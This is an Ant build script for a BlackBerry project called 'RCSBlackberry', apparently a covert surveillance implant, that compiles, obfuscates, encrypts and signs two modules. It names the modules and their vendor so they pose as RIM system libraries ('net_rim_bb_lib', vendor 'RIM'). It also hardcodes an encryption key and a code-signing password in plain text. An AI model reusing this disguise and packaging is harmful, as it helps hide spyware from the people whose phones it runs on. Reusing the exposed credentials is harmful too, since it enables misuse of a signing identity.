<project name="RCSBlackberry" default="help" basedir=".">
	<typedef resource="bb-ant-defs.xml" />
	<!-- <taskdef resource="net/sf/antcontrib/antcontrib.properties" /> -->
	
	<taskdef resource="net/sf/antcontrib/antlib.xml">
		<classpath>
			<pathelement location="bb-tools/ant-contrib-1.0b3.jar"/>
		</classpath>
	</taskdef>

	<!-- Environment properties -->
	<property file="local.properties" />

	<path id="lib.classpath">
		<path location="${net_rim_api.jar}" />
	</path>

	<!-- Internal properties -->
	<property name="wtk.cldc.version" value="1.1" />
	<property name="wtk.midp.version" value="2.0" />
	<!-- property name="obfuscation" value="true" -->
	<property name="resources" location="res" />

	<!-- Application properties -->
	<property name="ht.vendor" value="RIM" />
	<property name="ht.version" value="1.0" />

	<property name="core.codename" value="net_rim_bb_lib" />
	<property name="lib.codename" value="net_rim_bb_lib_base" />
	<property name="group.name" value="Rim Library" />

	<!-- Symbols 
	DEBUG: versione con i log di debug su file
	RELEASE: versione strippata e offuscata
	DBC: verifiche Design by contract
	FAKECONF: configurazione presa da codice
	DEMO: versione demo, a meno di binary patch
	NODEMO: inibisce la demo.	
	-->
	<property name="preprocess.debug.symbols" value="DEBUG,NODEMO,DBC" />
	<property name="preprocess.test.symbols" value="TEST" />
	<property name="preprocess.release.symbols" value="RELEASE,NODEMO" />
	<property name="preprocess.demo.symbols" value="RELEASE,DEMO" />

	<!-- Sources -->
	<property name="lib.src" location="RCSBlackBerryResources/src" />
	<property name="core.src" location="RCSBlackBerry/src" />

	<!-- WTK Task definition -->
	<taskdef name="wtkpreprocess" classname="de.pleumann.antenna.WtkPreprocess" classpath="${antenna.jar}" />
	<taskdef name="wtkbuild" classname="de.pleumann.antenna.WtkBuild" classpath="${antenna.jar}" />
	<taskdef name="wtkpreverify" classname="de.pleumann.antenna.WtkPreverify" classpath="${antenna.jar}" />
	<taskdef name="wtkpackage" classname="de.pleumann.antenna.WtkPackage" classpath="${antenna.jar}" />
	<taskdef name="wtkrapc" classname="de.pleumann.antenna.WtkRapc" classpath="${antenna.jar}" />
	<taskdef name="wtkobfuscate" classname="de.pleumann.antenna.WtkObfuscate" classpath="${antenna.jar}" />
	<taskdef name="wtkjad" classname="de.pleumann.antenna.WtkJad" classpath="${antenna.jar}" />

	<taskdef name="crypter" classname="za.co.massdosage.ant.Crypter">
		<classpath>
			<pathelement path="crypter/build/archive/crypter-ant.jar" />
		</classpath>
	</taskdef>

	<target name="encrypt-messages">
		<delete file="RCSBlackberry/src/messages.bin" />
		<crypter encrypt="true" keyFile="0x5333494a32158f52" inputFile="RCSBlackberry/preprocess/messages.properties.all" outputFile="RCSBlackberry/src/messages.bin" />
	</target>

	<target name="Display-Builtins" description="Display Builtin Properties">
		<!-- the absolute path to the location of the buildfile -->
		<echo>${basedir}</echo>
		<!-- the absolute path of the buildfile -->
		<echo>${ant.file}</echo>
		<!-- ant.version - the version of Ant that you are running -->
		<echo>${ant.version}</echo>
		<!-- ant.project.name - the name of the project that is currently executing; it is set in the name attribute of <project>. -->
		<echo>${ant.project.name}</echo>
		<!-- ant.java.version - the JVM version Ant detected; currently it can hold the values "1.1", "1.2", "1.3", "1.4" and "1.5". -->
		<echo>${ant.java.version}</echo>
	</target>

	<macrodef name="preprocess">
		<attribute name="dir.src" />
		<attribute name="dir.to" />
		<attribute name="preprocess.symbols" default="" />
		<attribute name="exclude" default="**/tests/" />
		<sequential>
			<echo message="=== Preprocess @{dir.src} => @{dir.to} ===" />
			<mkdir dir="@{dir.to}" />
			<copy todir="@{dir.to}">
				<fileset dir="@{dir.src}">
					<exclude name="@{exclude}" />
				</fileset>
			</copy>
			<replace dir="@{dir.to}" token="//#preprocess" value="//!preprocess" />
			<wtkpreprocess verbose="false" srcdir="@{dir.to}" destdir="@{dir.to}" symbols="@{preprocess.symbols}" />
		</sequential>
	</macrodef>


	<macrodef name="libbuild">
		<attribute name="preprocess.symbols" />
		<attribute name="version" />
		<sequential>
			<echo message="=============" />
			<echo message="===  LIB  ===" />
			<echo message="=============" />
			<echo>jde.home=${jde.home}</echo>
			<local name="builddir" />
			<property name="builddir" location="build/lib/@{version}" />
			<mkdir dir="${builddir}/unverified" />
			<mkdir dir="${builddir}/preprocessed" />

			<!-- Create a JAD file. -->
			<wtkjad jadfile="${builddir}/lib.jad" jarfile="${builddir}/lib.jar" name="${lib.codename}" vendor="${ht.vendor}" version="${ht.version}">
				<attribute name="MicroEdition-Configuration" value="CLDC-${wtk.cldc.version}" />
				<attribute name="MicroEdition-Profile" value="MIDP-${wtk.midp.version}" />
				<attribute name="RIM-Library-Flags" value="2" />
			</wtkjad>

			<!-- Create a RAPC file. -->
			<manifest file="${builddir}/lib.rapc">
				<attribute name="MIDlet-Name" value="${core.codename}" />
				<attribute name="MIDlet-Version" value="${ht.version}" />
				<attribute name="MIDlet-Vendor" value="${ht.vendor}" />
				<attribute name="MIDlet-Jar-URL" value="lib.jar" />
				<attribute name="MIDlet-Jar-Size" value="0" />
				<attribute name="MicroEdition-Profile" value="MIDP-${wtk.midp.version}" />
				<attribute name="MicroEdition-Configuration" value="CLDC-${wtk.cldc.version}" />
				<attribute name="RIM-Library-Flags" value="2" />
			</manifest>

			<!-- Preprocess. -->
			<preprocess dir.src="${lib.src}" dir.to="${builddir}/preprocessed" />

			<!-- Compile everything, but don't preverify (yet). -->
			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="false" />

			<!-- Package our newly compiled classes. -->
			<wtkpackage jarfile="${builddir}/lib.jar" jadfile="${builddir}/lib.jad">
				<fileset dir="${builddir}/unverified" />
				<fileset dir="${builddir}/preprocessed" includes="**/*.bin" />
			</wtkpackage>

			<!-- Preverify -->
			<wtkpreverify jarfile="${builddir}/lib.jar" jadfile="${builddir}/lib.jad">
				<classpath refid="lib.classpath" />
			</wtkpreverify>

			<!-- Rapc -->
			<mkdir dir="output/@{version}" />
			<wtkrapc jadfile="${builddir}/lib.jad" source="${builddir}/lib.jar" codename="${lib.codename}" import="${net_rim_api.jar}" destdir="output/@{version}" midlet="false" library="true" />

			<!--
			rapc.exe -nomain library=deliverables\Standard\4.5.0\net_rim_bb_lib_base 
			deliverables\Standard\4.5.0\net_rim_bb_lib_base.rapc 
			-sourceroot=C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\src;C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\res 
			-import=C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\lib\net_rim_api.jar 
			C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\bin

	         <exec dir="${builddir}" executable="${bb.buildjars.home}/rapc.exe" failonerror="true">
	                <arg value="-nomain" />
	                <arg value="import=${net_rim_api.jar}" />
	                <arg value="codename=${lib.codename}" />
	                <arg file="${builddir}/lib.rapc" />
	                <arg file="${builddir}/lib.jar" />
	            </exec>
			-->

			<copy file="${builddir}/lib.jar" tofile="output/@{version}/${lib.codename}.jar" />
			<move todir="${builddir}">
				<fileset dir=".">
					<include name="${lib.codename}*" />
				</fileset>
			</move>

		</sequential>
	</macrodef>

	<macrodef name="corebuild">
		<attribute name="preprocess.symbols" />
		<attribute name="kind" />
		<attribute name="version" />

		<sequential>
			<echo message="=============" />
			<echo message="===  CORE ===" />
			<echo message="=============" />

			<local name="builddir" />
			<property name="builddir" location="build/core/@{version}/@{kind}" />

			<mkdir dir="${builddir}/unverified" />
			<mkdir dir="${builddir}/preprocessed" />

			<!-- Create a JAD file. -->
			<wtkjad jadfile="${builddir}/core.jad" jarfile="${builddir}/core.jar" name="${core.codename}" vendor="${ht.vendor}" version="${ht.version}">
				<attribute name="MicroEdition-Configuration" value="CLDC-${wtk.cldc.version}" />
				<attribute name="MicroEdition-Profile" value="MIDP-${wtk.midp.version}" />
				<attribute name="RIM-MIDlet-Flags-1" value="3" />
				<attribute name="RIM-COD-Module-Name" value="${core.codename}" />
				<attribute name="MIDlet-Name" value="${core.codename}" />
			</wtkjad>

			<!-- Create a RAPC file. -->
			<manifest file="${builddir}/core.rapc">
				<attribute name="MIDlet-Name" value="${core.codename}" />
				<attribute name="MIDlet-Version" value="${ht.version}" />
				<attribute name="MIDlet-Vendor" value="${ht.vendor}" />
				<attribute name="MIDlet-Jar-URL" value="core.jar" />
				<attribute name="MIDlet-Jar-Size" value="0" />
				<attribute name="MicroEdition-Profile" value="MIDP-${wtk.midp.version}" />
				<attribute name="MicroEdition-Configuration" value="CLDC-${wtk.cldc.version}" />
				<attribute name="MIDlet-1" value="${core.codename},res/Blackberry_icon_sml.png," />
				<attribute name="RIM-MIDlet-Flags-1" value="3" />
			</manifest>

			<!-- Preprocess. -->
			<if>
				<equals arg1="@{kind}" arg2="test" />
				<then>
					<echo message="Test preprocess" />
					<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" exclude="" />
				</then>
				<else>
					<echo message="Normal preprocess" />
					<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" />
				</else>
			</if>


			<!-- Compile everything, but don't preverify (yet). -->
			<echo>lib: "output/@{version}/${lib.codename}.jar" </echo>
			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="true" bootclasspath="${net_rim_api.jar}">
				<classpath>
					<path id="core.classpath">
						<path location="${net_rim_api.jar}" />
						<path location="output/@{version}/${lib.codename}.jar" />
					</path>
				</classpath>
			</wtkbuild>

			<!-- Package our newly compiled classes. -->
			<wtkpackage jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad">
				<fileset dir="${builddir}/unverified" />
				<fileset dir="${core.src}/../res" includes="**/*.png" />
			</wtkpackage>

			<!-- Obfuscate -dontshrink -->
			<wtkobfuscate jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad">
				<classpath refid="core.classpath" />
				<argument value="'-keep public class blackberry.Main { public *; }'" />
				<argument value="'-keep public class ** extends javax.microedition.midlet.MIDlet { public *; }'" />
				<argument value="-repackageclasses '' -allowaccessmodification -microedition -dontusemixedcaseclassnames" />
				<argument value="-printusage" />
			</wtkobfuscate>

			<!-- Preverify -->
			<wtkpreverify jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad">
				<classpath refid="core.classpath" />
			</wtkpreverify>

			<!-- Rapc 
			<wtkrapc jadfile="${builddir}/core.jad" source="${builddir}/core.jar" codename="${core.codename}" import="${net_rim_api.jar};output/@{version}/lib.jar" destdir="${builddir}" quiet="true" midlet="false" library="false" />
			rapc.exe -cr codename=deliverables\Standard\4.5.0\net_rim_bb_lib 
			deliverables\Standard\4.5.0\net_rim_bb_lib.rapc 
			-sourceroot=C:\HT\RCSBlackBerry\Workspace\RCSBlackBerry\src;C:\HT\RCSBlackBerry\Workspace\RCSBlackBerry\src\blackberry 
			-import=C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\lib\net_rim_api.jar;C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\deliverables\Standard\4.5.0\net_rim_bb_lib_base.jar 
			C:\HT\RCSBlackBerry\Workspace\RCSBlackBerry\bin
					
			-->

			<exec dir="${builddir}" executable="${bb.buildjars.home}/rapc.exe" failonerror="true">
				<arg value="-quiet" />
				<arg value="-import=${net_rim_api.jar};${builddir}/../../../../output/@{version}/${lib.codename}.jar" />
				<arg value="codename=${core.codename}" />
				<arg file="${builddir}/core.rapc" />
				<arg file="${builddir}/core.jar" />
			</exec>

			<copy file="preprocess/signature.csl" tofile="${builddir}/${core.codename}.csl" />
			<copy file="preprocess/signature.cso" tofile="${builddir}/${core.codename}.cso" />
			<move todir="${builddir}">
				<fileset dir=".">
					<include name="${core.codename}*" />
				</fileset>
			</move>

			<!-- Sign -->
			<sign dir="${builddir}" cod="${core.codename}.cod" />

			<!-- Dist -->
			<mkdir dir="output/@{version}/@{kind}" />
			<copy file="${builddir}/${core.codename}.cod" todir="output/@{version}/@{kind}" />
			<copy file="output/@{version}/${lib.codename}.cod" todir="output/@{version}/@{kind}" />
		</sequential>
	</macrodef>

	<!-- Sign the COD  -->
	<macrodef name="sign">
		<attribute name="cod" />
		<attribute name="dir" />
		<sequential>
			<echo message="=== Sign @{dir}/@{cod} ===" />

			<!--<sigtool jdehome="${jde.home}" codfile="output/tocod/${codename}.cod" /> -->
			<java jar="${blackberry.certificate.dir}/SignatureTool.jar" fork="true" dir="@{dir}" failonerror="true">
				<arg line=" -a -p KUZ93HQ1 -c -s @{cod}" />
			</java>
		</sequential>
	</macrodef>



	<target name="init" depends="clean">
		<echo message="=== Init ===" />
		<tstamp>
			<format property="timestamp.BUILD" pattern="yyyyMMdd-hhmmss" />
		</tstamp>
		<buildnumber />
		<copy file="RCSBlackberry/preprocess/Cfg.java" toFile="RCSBlackberry/src/blackberry/config/Cfg.java" overwrite="true">
			<filterset>
				<filter token="BUILD_ID" value="${build.number}" />
				<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />

				<filter token="GROUP_NAME" value="${group.name}" />
				<filter token="MODULE_NAME" value="${core.codename}" />
				<filter token="MODULE_LIB_NAME" value="${lib.codename}" />
			</filterset>
		</copy>
		<mkdir dir="build" />
		<mkdir dir="build/core" />
		<mkdir dir="build/lib" />
		<mkdir dir="output" />
	</target>

	<target name="clean">
		<echo message="=== Clean ===" />
		<delete dir="build" includeEmptyDirs="true" />
		<delete dir="output" includeEmptyDirs="true" />
	</target>


	<!-- list="45,50" -->
	<target name="build" depends="init,encrypt-messages">
		<for list="45" param="version">
			<sequential>
				<echo message="==============" />
				<echo message="===  BUILD === ------------------------------------------------------------" />
				<echo message="==============" />
				<echo>Version @{version}</echo>
				<local name="jde.local.home" />
				<propertycopy name="jde.local.home" from="jde.@{version}.home" />
				<var name="jde.home" value="${jde.local.home}" />
				<var name="net_rim_api.jar" value="${jde.home}/lib/net_rim_api.jar" />
				<var name="bb.buildjars.home" value="${jde.home}/bin" />

				<echo>jde.home=${jde.home}</echo>

				<libbuild version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />

				<echo message="_____________" />
				<echo message="     DEBUG   " />
				<corebuild kind="debug" version="@{version}" preprocess.symbols="${preprocess.debug.symbols}" />

				<echo message="_____________" />
				<echo message="    RELEASE  " />
				<corebuild kind="release" version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />

				<echo message="_____________" />
				<echo message="     DEMO    " />
				<corebuild kind="demo" version="@{version}" preprocess.symbols="${preprocess.demo.symbols}" />
				<!--
				<echo message="_____________" />
				<echo message="     TEST    " />
				<corebuild kind="test" version="@{version}" preprocess.symbols="${preprocess.test.symbols}" />			
				-->
			</sequential>
		</for>
	</target>

	<!-- Load to device depends="sign" -->
	<target name="upload">
		<echo message="=== Load ===" />
		<echo>${jde.45.home}/bin/JavaLoader.exe ${lib.codename}.cod ${core.codename}.cod</echo>
		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
			<arg value="-wrddr" />
			<arg value="-u" />
			<arg value="load" />
			<arg value="output/45/debug//${lib.codename}.cod" />
			<arg value="output/45/debug/${core.codename}.cod" />
		</exec>
	</target>

	<!-- Load to device depends="sign" -->
	<target name="updatecoredebug">
		<echo message="=== Load ===" />
		<echo>${jde.45.home}/bin/JavaLoader.exe ${core.codename}.cod</echo>
		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
			<arg value="-wrddr" />
			<arg value="-u" />
			<arg value="load" />
			<arg value="output/45/debug/${core.codename}.cod" />
		</exec>
	</target>

	<target name="update" depends="updatecoredebug" />

	<property name="blackberry.simulator.path" location="${jde.45.home}\simulator" />
	<property name="simulator.model" value="8300" />

	<!-- To run the application in simulator
	PS C:\Users\fabrizio\blackberry\Workspace> C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\simulator\
	fledgecontroller.exe /session=8300
	Pause(5)
    RemoteCallCreation("555-1234")
    Pause(2)
    ThumbwheelPress
    ThumbwheelRelease
    Pause(10)
    KeyPress(ESCAPE)
    Pause(2)
    KeyRelease(ESCAPE)
    Exit

    http://docs.blackberry.com/en/developers/deliverables/606/BlackBerry_Device_Simulator_User_Guide.pdf
	-->
	<target name="simulator" description="Run in ${simulator.model} Simulator">

		<exec dir="${blackberry.simulator.path}" executable="${blackberry.simulator.path}/fledge.exe" spawn="true">
			<arg line=" /app=Jvm.dll " />
			<arg line=" /handheld=${simulator.model} " />
			<arg line=" /session=${simulator.model} " />
			<arg line=" /app-param=DisableRegistration " />
			<arg line=" /app-param=JvmAlxConfigFile:${simulator.model}.xml " />
			<arg line=" /data-port=0x4d44 " />
			<arg line=" /data-port=0x4d4e " />
			<arg line=" /pin=0x2100000A " />
		</exec>

	</target>

	<target name="help">
		<echo>ant build :  full build and sig</echo>
		<echo>ant simulator :  starts the simulator</echo>
		<echo>ant upload : uploads both the core and the lib</echo>
		<echo>ant updatecoredebug : uploads the core debug 45</echo>
	</target>
</project>
